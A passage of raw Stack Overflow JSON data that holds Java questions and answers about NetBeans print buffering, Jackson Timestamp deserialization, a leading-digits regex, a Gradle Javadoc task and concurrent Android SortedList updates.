to add a default value of 0. I'm not sure if this is the correct way to do that though.</p>\n<p>Additionally, I'm still getting the error: Index: 0 Size: 0--meaning that the strings array list is empty.</p>\n<p>Any idea why this may be so?</p>\n<p>Thanks.</p>\n"},{"tags":["java","netbeans","printing","println","netbeans-12"],"comments":[{"owner":{"account_id":14357,"reputation":9128,"user_id":29470,"display_name":"Tim Moore"},"score":0,"creation_date":1642471528,"post_id":70749512,"comment_id":125073924,"body_markdown":"This is a bug in Netbeans https://stackoverflow.com/q/63850071/29470","body":"This is a bug in Netbeans <a href=\"https://stackoverflow.com/q/63850071/29470\">stackoverflow.com/q/63850071/29470</a>"},{"owner":{"account_id":23685228,"reputation":1103,"user_id":17710270,"display_name":"passer-by"},"score":0,"creation_date":1642473097,"post_id":70749512,"comment_id":125074146,"body_markdown":"1)  [`System.out`](https://docs.oracle.com/javase/7/docs/api/java/lang/System.html#out) is a `PrintStream`.  2)  the [PrintStream documentation](https://docs.oracle.com/javase/8/docs/api/java/io/PrintStream.html) describes the behaviour you are seeing,","body":"1)  <a href=\"https://docs.oracle.com/javase/7/docs/api/java/lang/System.html#out\" rel=\"nofollow noreferrer\"><code>System.out</code></a> is a <code>PrintStream</code>.  2)  the <a href=\"https://docs.oracle.com/javase/8/docs/api/java/io/PrintStream.html\" rel=\"nofollow noreferrer\">PrintStream documentation</a> describes the behaviour you are seeing,"}],"answers":[{"tags":[],"owner":{"account_id":9400379,"reputation":442,"user_id":9754585,"display_name":"Drivers Sea"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1642472638,"creation_date":1642472638,"answer_id":70749624,"question_id":70749512,"body_markdown":"print() adds a string to the PrintStream without flushing it. If you want it flushed you need to add the flush() command after it. The println() automatically flushes it so this will also work. Also, to be clear, this is not a bug.","title":"Java print() not printing until println() NetBeans","body":"<p>print() adds a string to the PrintStream without flushing it. If you want it flushed you need to add the flush() command after it. The println() automatically flushes it so this will also work. Also, to be clear, this is not a bug.</p>\n"}],"owner":{"account_id":18520547,"reputation":57,"user_id":13493674,"display_name":"exhausted"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":345,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70749624,"answer_count":1,"score":0,"last_activity_date":1642472638,"creation_date":1642471269,"question_id":70749512,"body_markdown":"I just installed NetBeans 12.6 today, and I&#39;m having an issue with System.out.print() in the code I pasted below. For some reason, the print() in removeValue doesn&#39;t print until the println() in the for loop in main. When I ran this code in BlueJ, everything worked fine. Is something wrong with my NetBeans or ??\r\n\r\nDesired output would look something like:\r\n\r\n&gt; Enter index: 2  \r\n1  \r\n3\r\n\r\nInstead, it looks like:\r\n\r\n&gt; 2  \r\nEnter index: 1  \r\n3\r\n\r\n    package e.mavenproject1;\r\n    import java.util.Scanner;\r\n    \r\n    public class NewClass {\r\n        static Scanner input = new Scanner(System.in);\r\n        \r\n        public static void main(String[]args) {\r\n            int[] array = {1, 2, 3};\r\n      \r\n            array = removeValue(array);\r\n        \r\n            for (int i = 0; i &lt; array.length; i++) {\r\n               System.out.println(array[i]);\r\n            }\r\n        }\r\n    \r\n        public static int[] removeValue(int[] array) {\r\n             System.out.print(&quot;Enter index: &quot;);\r\n             int index = input.nextInt() - 1;\r\n\r\n             int[] copy = new int[array.length - 1];\r\n\r\n             for (int i = 0, j = 0; i &lt; array.length; i++) {\r\n                 if (i != index) {\r\n                     copy[j++] = array[i];\r\n                 }\r\n             }\r\n             return copy;\r\n         }\r\n    }","title":"Java print() not printing until println() NetBeans","body":"<p>I just installed NetBeans 12.6 today, and I'm having an issue with System.out.print() in the code I pasted below. For some reason, the print() in removeValue doesn't print until the println() in the for loop in main. When I ran this code in BlueJ, everything worked fine. Is something wrong with my NetBeans or ??</p>\n<p>Desired output would look something like:</p>\n<blockquote>\n<p>Enter index: 2<br />\n1<br />\n3</p>\n</blockquote>\n<p>Instead, it looks like:</p>\n<blockquote>\n<p>2<br />\nEnter index: 1<br />\n3</p>\n</blockquote>\n<pre><code>package e.mavenproject1;\nimport java.util.Scanner;\n\npublic class NewClass {\n    static Scanner input = new Scanner(System.in);\n    \n    public static void main(String[]args) {\n        int[] array = {1, 2, 3};\n  \n        array = removeValue(array);\n    \n        for (int i = 0; i &lt; array.length; i++) {\n           System.out.println(array[i]);\n        }\n    }\n\n    public static int[] removeValue(int[] array) {\n         System.out.print(&quot;Enter index: &quot;);\n         int index = input.nextInt() - 1;\n\n         int[] copy = new int[array.length - 1];\n\n         for (int i = 0, j = 0; i &lt; array.length; i++) {\n             if (i != index) {\n                 copy[j++] = array[i];\n             }\n         }\n         return copy;\n     }\n}\n</code></pre>\n"},{"tags":["java","json","jackson","deserialization"],"comments":[{"owner":{"account_id":9760,"reputation":85859,"user_id":18157,"accept_rate":100,"display_name":"Jim Garrison"},"score":0,"creation_date":1642467906,"post_id":70749092,"comment_id":125073342,"body_markdown":"Where&#39;s your ***de***-serializer?  Also, `sdf.format(value)` can&#39;t throw `DateTimeParseException`... have you confused serialization and de-serialization?","body":"Where&#39;s your <b><i>de</i></b>-serializer?  Also, <code>sdf.format(value)</code> can&#39;t throw <code>DateTimeParseException</code>... have you confused serialization and de-serialization?"},{"owner":{"account_id":476146,"reputation":1754,"user_id":886895,"accept_rate":67,"display_name":"simgineer"},"score":0,"creation_date":1642468068,"post_id":70749092,"comment_id":125073364,"body_markdown":"Do I need to add a deserializer with a class such as:\nhttps://fasterxml.github.io/jackson-databind/javadoc/2.7/com/fasterxml/jackson/databind/JsonDeserializer.html\n?","body":"Do I need to add a deserializer with a class such as: <a href=\"https://fasterxml.github.io/jackson-databind/javadoc/2.7/com/fasterxml/jackson/databind/JsonDeserializer.html\" rel=\"nofollow noreferrer\">fasterxml.github.io/jackson-databind/javadoc/2.7/com/fasterx&zwnj;&#8203;ml/&hellip;</a> ?"},{"owner":{"account_id":9760,"reputation":85859,"user_id":18157,"accept_rate":100,"display_name":"Jim Garrison"},"score":0,"creation_date":1642468794,"post_id":70749092,"comment_id":125073467,"body_markdown":"Basic principle: If you serialized something yourself, unless you duplicated an existing built-in serializer (why would you do that), you will have to provide the corresponding de-serializer.  `DateTimeParserException`, cannot occur here, but _could_ occur in a deserializer.","body":"Basic principle: If you serialized something yourself, unless you duplicated an existing built-in serializer (why would you do that), you will have to provide the corresponding de-serializer.  <code>DateTimeParserException</code>, cannot occur here, but <i>could</i> occur in a deserializer."}],"answers":[{"tags":[],"owner":{"account_id":476146,"reputation":1754,"user_id":886895,"accept_rate":67,"display_name":"simgineer"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1642472371,"creation_date":1642470327,"answer_id":70749431,"question_id":70749092,"body_markdown":"Looks like a solution was to add a deserializer but an even more ideal solution per Jim&#39;s suggestion is to use a built-in serializer which works for the string format I am using.\r\n\r\n    @JsonFormat(shape=JsonFormat.Shape.STRING, pattern=&quot;yyyy-MM-dd HH:mm:ss&quot;)\r\n    Timestamp startTime;","title":"Exception deserializing JSON String to java.sql.Timestamp w Jackson","body":"<p>Looks like a solution was to add a deserializer but an even more ideal solution per Jim's suggestion is to use a built-in serializer which works for the string format I am using.</p>\n<pre><code>@JsonFormat(shape=JsonFormat.Shape.STRING, pattern=&quot;yyyy-MM-dd HH:mm:ss&quot;)\nTimestamp startTime;\n</code></pre>\n"}],"owner":{"account_id":476146,"reputation":1754,"user_id":886895,"accept_rate":67,"display_name":"simgineer"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1607,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1642472497,"creation_date":1642466511,"question_id":70749092,"body_markdown":"I get this error when attempting to deserialize but I feel there is a deserializing interface i need to configure.\r\n\r\nThe error:\r\n\r\n    com.fasterxml.jackson.databind.exc.InvalidFormatException: Cannot deserialize value of type `java.sql.Timestamp` from String &quot;2022-01-13 23:57:58&quot;: not a valid representation (error: Failed to parse Date value &#39;2022-01-13 23:57:58&#39;: Cannot parse date &quot;2022-01-13 23:57:58&quot;: while it seems to fit format &#39;yyyy-MM-dd&#39;T&#39;HH:mm:ss.SSSX&#39;, parsing fails (leniency? null))\r\n     at [Source: (String)&quot;{&quot;endTime&quot;: &quot;2022-01-13 23:57:58&quot;, &quot;startTime&quot;: &quot;2022-01-13 23:57:56&quot;, &quot;numResults&quot;: 6, &quot;numFailures&quot;: 0, &quot;sampleResults&quot;: {&quot;0&quot;: {&quot;id&quot;: 0, &quot;enabled&quot;: false, &quot;resultsMap&quot;: {&quot;tst&quot;: &quot;FAIL&quot;, &quot;tst2&quot;: &quot;PASS&quot;}, &quot;containerId&quot;: null, &quot;criteriaMap&quot;: {}}, &quot;1&quot;: {&quot;id&quot;: 1, &quot;enabled&quot;: false, &quot;resultsMap&quot;: {&quot;tst&quot;: &quot;FAIL&quot;, &quot;tst2&quot;: &quot;PASS&quot;}, &quot;containerId&quot;: null, &quot;criteriaMap&quot;: {}}, &quot;2&quot;: {&quot;id&quot;: 2, &quot;enabled&quot;: true, &quot;resultsMap&quot;: {}, &quot;containerId&quot;: null, &quot;criteriaMap&quot;: {&quot;ICCI_VE_OSW_B_Z01&quot;: &quot;N_A&quot;, &quot;ICCI_VE_OSW_B_Z02&quot;&quot;[truncated 464 chars]; line: 1, column: 13] (through reference chain: filtec.test.TestRun[&quot;endTime&quot;])\r\n    \tat com.fasterxml.jackson.databind.exc.InvalidFormatException.from(InvalidFormatException.java:67)\r\n    \tat com.fasterxml.jackson.databind.DeserializationContext.weirdStringException(DeserializationContext.java:1991)\r\n    \tat com.fasterxml.jackson.databind.DeserializationContext.handleWeirdStringValue(DeserializationContext.java:1219)\r\n    \tat com.fasterxml.jackson.databind.deser.std.StdDeserializer._parseDate(StdDeserializer.java:1261)\r\n        ...\r\n    \tat com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:322)\r\n    \tat com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4675)\r\n    \tat com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3630)\r\n    \tat com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3598)\r\n    \tat filtec.db.TestRunEntity.getData(TestRunEntity.java:79)\r\n\r\nthe calling method:\r\n\r\n    public TestRun getData() {\r\n        TestRun data = null;\r\n        try {\r\n            data = MAPPER.readValue(jsonDoc, TestRun.class);\r\n        } catch (JsonProcessingException e) {\r\n            ApplicationManager.logStackTrace(e);\r\n        }\r\n        return data;\r\n    }\r\n\r\nmy serializer:\r\n\r\n    public class JsonTimestampSerializer extends JsonSerializer&lt;Timestamp&gt; {\r\n        @Override\r\n        public void serialize(Timestamp value, JsonGenerator gen, SerializerProvider serializers) throws IOException {\r\n            try {\r\n                SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);\r\n                String s = sdf.format(value);\r\n                gen.writeString(s);\r\n            } catch (DateTimeParseException e) {\r\n                System.err.println(e);\r\n                gen.writeString(&quot;&quot;);\r\n            }\r\n        }\r\n    }\r\n\r\nand my TestRun POJO fields:\r\n\r\n    public class TestRun {\r\n        //...\r\n        /** Internal state of a test run. */\r\n        enum State {\r\n            CREATED,\r\n            IN_PROGRESS,\r\n            COMPLETE\r\n        }\r\n        \r\n        /** State of the test session. */\r\n        State state = State.CREATED;\r\n        \r\n        /** The start time of the run. */\r\n        @JsonSerialize(using = JsonTimestampSerializer.class)\r\n        Timestamp startTime;\r\n        \r\n        /** The end time of the test run. */\r\n        @JsonSerialize(using = JsonTimestampSerializer.class)\r\n        Timestamp endTime;\r\n\r\n","title":"Exception deserializing JSON String to java.sql.Timestamp w Jackson","body":"<p>I get this error when attempting to deserialize but I feel there is a deserializing interface i need to configure.</p>\n<p>The error:</p>\n<pre><code>com.fasterxml.jackson.databind.exc.InvalidFormatException: Cannot deserialize value of type `java.sql.Timestamp` from String &quot;2022-01-13 23:57:58&quot;: not a valid representation (error: Failed to parse Date value '2022-01-13 23:57:58': Cannot parse date &quot;2022-01-13 23:57:58&quot;: while it seems to fit format 'yyyy-MM-dd'T'HH:mm:ss.SSSX', parsing fails (leniency? null))\n at [Source: (String)&quot;{&quot;endTime&quot;: &quot;2022-01-13 23:57:58&quot;, &quot;startTime&quot;: &quot;2022-01-13 23:57:56&quot;, &quot;numResults&quot;: 6, &quot;numFailures&quot;: 0, &quot;sampleResults&quot;: {&quot;0&quot;: {&quot;id&quot;: 0, &quot;enabled&quot;: false, &quot;resultsMap&quot;: {&quot;tst&quot;: &quot;FAIL&quot;, &quot;tst2&quot;: &quot;PASS&quot;}, &quot;containerId&quot;: null, &quot;criteriaMap&quot;: {}}, &quot;1&quot;: {&quot;id&quot;: 1, &quot;enabled&quot;: false, &quot;resultsMap&quot;: {&quot;tst&quot;: &quot;FAIL&quot;, &quot;tst2&quot;: &quot;PASS&quot;}, &quot;containerId&quot;: null, &quot;criteriaMap&quot;: {}}, &quot;2&quot;: {&quot;id&quot;: 2, &quot;enabled&quot;: true, &quot;resultsMap&quot;: {}, &quot;containerId&quot;: null, &quot;criteriaMap&quot;: {&quot;ICCI_VE_OSW_B_Z01&quot;: &quot;N_A&quot;, &quot;ICCI_VE_OSW_B_Z02&quot;&quot;[truncated 464 chars]; line: 1, column: 13] (through reference chain: filtec.test.TestRun[&quot;endTime&quot;])\n    at com.fasterxml.jackson.databind.exc.InvalidFormatException.from(InvalidFormatException.java:67)\n    at com.fasterxml.jackson.databind.DeserializationContext.weirdStringException(DeserializationContext.java:1991)\n    at com.fasterxml.jackson.databind.DeserializationContext.handleWeirdStringValue(DeserializationContext.java:1219)\n    at com.fasterxml.jackson.databind.deser.std.StdDeserializer._parseDate(StdDeserializer.java:1261)\n    ...\n    at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:322)\n    at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:4675)\n    at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3630)\n    at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3598)\n    at filtec.db.TestRunEntity.getData(TestRunEntity.java:79)\n</code></pre>\n<p>the calling method:</p>\n<pre><code>public TestRun getData() {\n    TestRun data = null;\n    try {\n        data = MAPPER.readValue(jsonDoc, TestRun.class);\n    } catch (JsonProcessingException e) {\n        ApplicationManager.logStackTrace(e);\n    }\n    return data;\n}\n</code></pre>\n<p>my serializer:</p>\n<pre><code>public class JsonTimestampSerializer extends JsonSerializer&lt;Timestamp&gt; {\n    @Override\n    public void serialize(Timestamp value, JsonGenerator gen, SerializerProvider serializers) throws IOException {\n        try {\n            SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);\n            String s = sdf.format(value);\n            gen.writeString(s);\n        } catch (DateTimeParseException e) {\n            System.err.println(e);\n            gen.writeString(&quot;&quot;);\n        }\n    }\n}\n</code></pre>\n<p>and my TestRun POJO fields:</p>\n<pre><code>public class TestRun {\n    //...\n    /** Internal state of a test run. */\n    enum State {\n        CREATED,\n        IN_PROGRESS,\n        COMPLETE\n    }\n    \n    /** State of the test session. */\n    State state = State.CREATED;\n    \n    /** The start time of the run. */\n    @JsonSerialize(using = JsonTimestampSerializer.class)\n    Timestamp startTime;\n    \n    /** The end time of the test run. */\n    @JsonSerialize(using = JsonTimestampSerializer.class)\n    Timestamp endTime;\n</code></pre>\n"},{"tags":["java","regex"],"comments":[{"owner":{"account_id":1310169,"reputation":3813,"user_id":1258319,"accept_rate":81,"display_name":"Julian"},"score":0,"creation_date":1642473958,"post_id":70748852,"comment_id":125074278,"body_markdown":"It would be nice if the upvote giver would provide a short explanation for the unvote reason. Thanks, no offence but I think this is a fair expectation.","body":"It would be nice if the upvote giver would provide a short explanation for the unvote reason. Thanks, no offence but I think this is a fair expectation."}],"answers":[{"tags":[],"owner":{"account_id":93689,"reputation":415931,"user_id":256196,"accept_rate":77,"display_name":"Bohemian"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1642464582,"creation_date":1642464582,"answer_id":70748911,"question_id":70748852,"body_markdown":"Use a *word boundary* `\\b`:\r\n\r\n    \\b\\d+\r\n\r\nSee [live demo][1].\r\n\r\nIf you strictly want to match only digits at the start of the input, and not from each word (same thing when the input contains only one word), use `^`:\r\n\r\n    ^\\d+\r\n\r\n---\r\n\r\n    Pattern DIGITS = Pattern.compile(&quot;\\\\b\\\\d+&quot;); // leading digits of all words\r\n    Pattern DIGITS = Pattern.compile(&quot;^\\\\d+&quot;); // leading digits of input\r\n\r\n\r\n\r\n  [1]: https://rubular.com/r/Km7A0rY0EyOG2N","title":"Regex for extracting all heading digits from a string","body":"<p>Use a <em>word boundary</em> <code>\\b</code>:</p>\n<pre><code>\\b\\d+\n</code></pre>\n<p>See <a href=\"https://rubular.com/r/Km7A0rY0EyOG2N\" rel=\"nofollow noreferrer\">live demo</a>.</p>\n<p>If you strictly want to match only digits at the start of the input, and not from each word (same thing when the input contains only one word), use <code>^</code>:</p>\n<pre><code>^\\d+\n</code></pre>\n<hr />\n<pre><code>Pattern DIGITS = Pattern.compile(&quot;\\\\b\\\\d+&quot;); // leading digits of all words\nPattern DIGITS = Pattern.compile(&quot;^\\\\d+&quot;); // leading digits of input\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4262060,"reputation":2207,"user_id":3486184,"display_name":"user3486184"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642472352,"creation_date":1642464691,"answer_id":70748930,"question_id":70748852,"body_markdown":"I&#39;d think something like &quot;^[0-9]*&quot; would work. There&#39;s a \\d that matches other Unicode digits if you want to include them as well.\r\n\r\nEdit: removed errant . from the string.","title":"Regex for extracting all heading digits from a string","body":"<p>I'd think something like &quot;^[0-9]*&quot; would work. There's a \\d that matches other Unicode digits if you want to include them as well.</p>\n<p>Edit: removed errant . from the string.</p>\n"}],"owner":{"account_id":1310169,"reputation":3813,"user_id":1258319,"accept_rate":81,"display_name":"Julian"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":52,"favorite_count":0,"down_vote_count":2,"up_vote_count":1,"accepted_answer_id":70748911,"answer_count":2,"score":-1,"last_activity_date":1642472352,"creation_date":1642464008,"question_id":70748852,"body_markdown":"I am trying to extract all heading digits from a string using Java regex without writing additional code and I could not find something to work:\r\n\r\n`&quot;12345XYZ6789ABC&quot;` should give me `&quot;12345&quot;`.  \r\n`&quot;X12345XYZ6789ABC&quot;` should give me nothing\r\n\r\n\r\n    public final class NumberExtractor {\r\n        private static final Pattern DIGITS = Pattern.compile(&quot;what should be my regex here?&quot;);\r\n\r\n        public static Optional&lt;Long&gt; headNumber(String token) {\r\n            var matcher = DIGITS.matcher(token);\r\n            return matcher.find() ? Optional.of(Long.valueOf(matcher.group())) : Optional.empty();\r\n        }\r\n    }\r\n","title":"Regex for extracting all heading digits from a string","body":"<p>I am trying to extract all heading digits from a string using Java regex without writing additional code and I could not find something to work:</p>\n<p><code>&quot;12345XYZ6789ABC&quot;</code> should give me <code>&quot;12345&quot;</code>.<br />\n<code>&quot;X12345XYZ6789ABC&quot;</code> should give me nothing</p>\n<pre><code>public final class NumberExtractor {\n    private static final Pattern DIGITS = Pattern.compile(&quot;what should be my regex here?&quot;);\n\n    public static Optional&lt;Long&gt; headNumber(String token) {\n        var matcher = DIGITS.matcher(token);\n        return matcher.find() ? Optional.of(Long.valueOf(matcher.group())) : Optional.empty();\n    }\n}\n</code></pre>\n"},{"tags":["java","android","android-studio","gradle","javadoc"],"comments":[{"owner":{"account_id":1547313,"reputation":82154,"user_id":1440565,"accept_rate":59,"display_name":"Code-Apprentice"},"score":0,"creation_date":1638079996,"post_id":70139740,"comment_id":123989162,"body_markdown":"Hopefully the links at the top of your question will help you solve this.","body":"Hopefully the links at the top of your question will help you solve this."},{"owner":{"account_id":267154,"reputation":686,"user_id":555153,"accept_rate":0,"display_name":"Seynorth"},"score":1,"creation_date":1642064426,"post_id":70139740,"comment_id":124974053,"body_markdown":"@Code-Apprentice, unfortunately no. The 4 links relate to the situation where the project does not compile successfully so the generated &quot;R&quot; class is not generated.","body":"@Code-Apprentice, unfortunately no. The 4 links relate to the situation where the project does not compile successfully so the generated &quot;R&quot; class is not generated."},{"owner":{"account_id":267154,"reputation":686,"user_id":555153,"accept_rate":0,"display_name":"Seynorth"},"score":1,"creation_date":1642064503,"post_id":70139740,"comment_id":124974085,"body_markdown":"I am facing the same problem as @VeceluXa, when generating the javadoc on the project compiling well, the generation indicates that it cannot resolve symbol &quot;R&quot; imported in several classes.","body":"I am facing the same problem as @VeceluXa, when generating the javadoc on the project compiling well, the generation indicates that it cannot resolve symbol &quot;R&quot; imported in several classes."}],"owner":{"account_id":20021141,"reputation":37,"user_id":14676068,"display_name":"VeceluXa"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":434,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"closed_date":1638059271,"answer_count":0,"score":0,"last_activity_date":1642472016,"creation_date":1638058858,"question_id":70139740,"body_markdown":"Recently I created gradle task to build JavaDoc. It was working flawlessly.\r\n\r\nAfter a while I decided to clean the mess in my file structure and moved my classes in separate packages according to their purpose. I fixed some errors that came with it and now my app works like before, but after that my JavaDoc task stopped working (the project builds and works as intended).\r\n\r\nI tested this build with previous file structure (all files in 1 package) and Javadoc compiled successfully.\r\n\r\nI think it comes down to my poor knowledge of gradle, but I can&#39;t figure out how to get JavaDoc task working with my new file structure.\r\n\r\n[![enter image description here][1]][1]\r\n\r\n[![enter image description here][2]][2]\r\n\r\n\r\nMy build.gradle:\r\n```\r\ntask javadoc(type: Javadoc) {\r\n    source = android.sourceSets.main.java.srcDirs\r\n    classpath += project.files(android.getBootClasspath().join(File.pathSeparator))\r\n    classpath += configurations.javadocDeps\r\n\r\n    options.memberLevel = JavadocMemberLevel.PRIVATE\r\n\r\n    afterEvaluate {\r\n        classpath += files(android.getBootClasspath())\r\n\r\n        def aarDependencies = classpath.filter { it.name.endsWith(&#39;.aar&#39;) }\r\n        classpath -= aarDependencies\r\n        aarDependencies.each { aar -&gt;\r\n\r\n            def outputPath = &quot;$buildDir/tmp/aarJar/${aar.name.replace(&#39;.aar&#39;, &#39;.jar&#39;)}&quot;\r\n            classpath += files(outputPath)\r\n\r\n            dependsOn task(name: &quot;extract ${aar.name}&quot;).doLast {\r\n                extractEntry(aar, &#39;classes.jar&#39;, outputPath)\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nprivate static def extractEntry(archive, entryPath, outputPath) {\r\n    if (!archive.exists()) {\r\n        throw new GradleException(&quot;archive $archive not found&quot;)\r\n    }\r\n\r\n    def zip = new ZipFile(archive)\r\n    zip.entries().each {\r\n        if (it.name == entryPath) {\r\n            def path = Paths.get(outputPath)\r\n            if (!Files.exists(path)) {\r\n                Files.createDirectories(path.getParent())\r\n                Files.copy(zip.getInputStream(it), path)\r\n            }\r\n        }\r\n    }\r\n    zip.close()\r\n}\r\n```\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/qBQtW.png\r\n  [2]: https://i.stack.imgur.com/e0QHk.png","title":"JavaDoc Build failed because class R not found","body":"<p>Recently I created gradle task to build JavaDoc. It was working flawlessly.</p>\n<p>After a while I decided to clean the mess in my file structure and moved my classes in separate packages according to their purpose. I fixed some errors that came with it and now my app works like before, but after that my JavaDoc task stopped working (the project builds and works as intended).</p>\n<p>I tested this build with previous file structure (all files in 1 package) and Javadoc compiled successfully.</p>\n<p>I think it comes down to my poor knowledge of gradle, but I can't figure out how to get JavaDoc task working with my new file structure.</p>\n<p><a href=\"https://i.stack.imgur.com/qBQtW.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/qBQtW.png\" alt=\"enter image description here\" /></a></p>\n<p><a href=\"https://i.stack.imgur.com/e0QHk.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/e0QHk.png\" alt=\"enter image description here\" /></a></p>\n<p>My build.gradle:</p>\n<pre><code>task javadoc(type: Javadoc) {\n    source = android.sourceSets.main.java.srcDirs\n    classpath += project.files(android.getBootClasspath().join(File.pathSeparator))\n    classpath += configurations.javadocDeps\n\n    options.memberLevel = JavadocMemberLevel.PRIVATE\n\n    afterEvaluate {\n        classpath += files(android.getBootClasspath())\n\n        def aarDependencies = classpath.filter { it.name.endsWith('.aar') }\n        classpath -= aarDependencies\n        aarDependencies.each { aar -&gt;\n\n            def outputPath = &quot;$buildDir/tmp/aarJar/${aar.name.replace('.aar', '.jar')}&quot;\n            classpath += files(outputPath)\n\n            dependsOn task(name: &quot;extract ${aar.name}&quot;).doLast {\n                extractEntry(aar, 'classes.jar', outputPath)\n            }\n        }\n    }\n}\n\nprivate static def extractEntry(archive, entryPath, outputPath) {\n    if (!archive.exists()) {\n        throw new GradleException(&quot;archive $archive not found&quot;)\n    }\n\n    def zip = new ZipFile(archive)\n    zip.entries().each {\n        if (it.name == entryPath) {\n            def path = Paths.get(outputPath)\n            if (!Files.exists(path)) {\n                Files.createDirectories(path.getParent())\n                Files.copy(zip.getInputStream(it), path)\n            }\n        }\n    }\n    zip.close()\n}\n</code></pre>\n"},{"tags":["java","android","list","android-recyclerview","concurrency"],"answers":[{"tags":[],"owner":{"account_id":9085266,"reputation":510,"user_id":6763532,"display_name":"cagney"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1642470058,"creation_date":1642470058,"answer_id":70749405,"question_id":70701271,"body_markdown":"My solution is to hold updates in a buffer which can only fire after a time delay. Then putting the update objects into both a concurrent hashmap for easy object retrieval as well as a sortedlist for easy ui display\r\n\r\n\r\nThe api calls this method. I have another version that can run off the ui thread by simply detaching the adapter in sortedlist callbacks.\r\n\r\n    public void onResult(Object object) {\r\n        \r\n            if ( !currentlyProcessing &amp;&amp; System.currentTimeMillis() &gt; (lastBatch + delay)) {\r\n    \r\n                currentlyProcessing = true;\r\n    \r\n                runOnUiThread(new Runnable() {\r\n                    @Override\r\n                    public void run() {\r\n    \r\n                        easyChatList.beginBatchedUpdates();\r\n    \r\n                        while (batchBuilder.size() &gt; 0){\r\n                            performBatch(batchBuilder.remove(0));\r\n                        }\r\n                        easyChatList.endBatchedUpdates();\r\n    \r\n                        lastBatch = System.currentTimeMillis();\r\n                        currentlyProcessing = false;\r\n                    }\r\n                });\r\n            }\r\n    }\r\n\r\nThe performbatch() handles a single update. If the object is new it puts it into a concurrent hashmap with its id as a key. Then adds it to the sortedlist. When an update occurs I pull the object from the hashmap, do the update and add it to the sortedlist. The sortedlist api then replaces the old object and updates the sort order.\r\n\r\nedit:this does have a slight drag according to androids skipped frames warning. You can detach the adapter from the sortedlist and do updates on a worker thread but I&#39;m not sure if that has any value as this is working alright for now.\r\n\r\n","title":"Android recycle view update sort list with concurrency issue","body":"<p>My solution is to hold updates in a buffer which can only fire after a time delay. Then putting the update objects into both a concurrent hashmap for easy object retrieval as well as a sortedlist for easy ui display</p>\n<p>The api calls this method. I have another version that can run off the ui thread by simply detaching the adapter in sortedlist callbacks.</p>\n<pre><code>public void onResult(Object object) {\n    \n        if ( !currentlyProcessing &amp;&amp; System.currentTimeMillis() &gt; (lastBatch + delay)) {\n\n            currentlyProcessing = true;\n\n            runOnUiThread(new Runnable() {\n                @Override\n                public void run() {\n\n                    easyChatList.beginBatchedUpdates();\n\n                    while (batchBuilder.size() &gt; 0){\n                        performBatch(batchBuilder.remove(0));\n                    }\n                    easyChatList.endBatchedUpdates();\n\n                    lastBatch = System.currentTimeMillis();\n                    currentlyProcessing = false;\n                }\n            });\n        }\n}\n</code></pre>\n<p>The performbatch() handles a single update. If the object is new it puts it into a concurrent hashmap with its id as a key. Then adds it to the sortedlist. When an update occurs I pull the object from the hashmap, do the update and add it to the sortedlist. The sortedlist api then replaces the old object and updates the sort order.</p>\n<p>edit:this does have a slight drag according to androids skipped frames warning. You can detach the adapter from the sortedlist and do updates on a worker thread but I'm not sure if that has any value as this is working alright for now.</p>\n"}],"owner":{"account_id":9085266,"reputation":510,"user_id":6763532,"display_name":"cagney"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":128,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70749405,"answer_count":1,"score":0,"last_activity_date":1642470058,"creation_date":1642097945,"question_id":70701271,"body_markdown":"I have a sorted list I would like to use to hold objects for maintaining a recycleview as usual.\r\n\r\nThe api I am interfacing with passes me updates through an interface callback using multiple threads. This api can add, remove or update object state. When the app opens there is a flurry of adds, removes and updates. Then it slowes down to some degreee. This is a reverse of the typical database paradigm where the UI updates faster than the data to one where the data updates faster than the UI\r\n\r\nThis seems to be an issue with the sortedList in android for several reasons.\r\n\r\n1) adding an item to sortedlist must be done on UI thread if updates to list are going to fully execute without simply adding to the list and swallowing the error in a background thread when trying to show the update\r\n\r\n2) to change an object state you must first get the index. then get the item. if your multithreading then you get index errors due to race conditions and pull the wrong object\r\n\r\n2) you can affect a list item object&#39;s state in a background thread but this still relies on a call to recalculate() or updateitem() type calls. this leads to reycleview is computing layout errors\r\n\r\nQuestion: Which design pattern would you use to solve this issue? Below are some of my ideas\r\n\r\nsolutions that seem bad\r\n\r\n 1) Swallow errors and use a timer to call notifydatasetchanged(). This really eliminates the purpose of using the sorted list. \r\n\r\n2) Collect updates 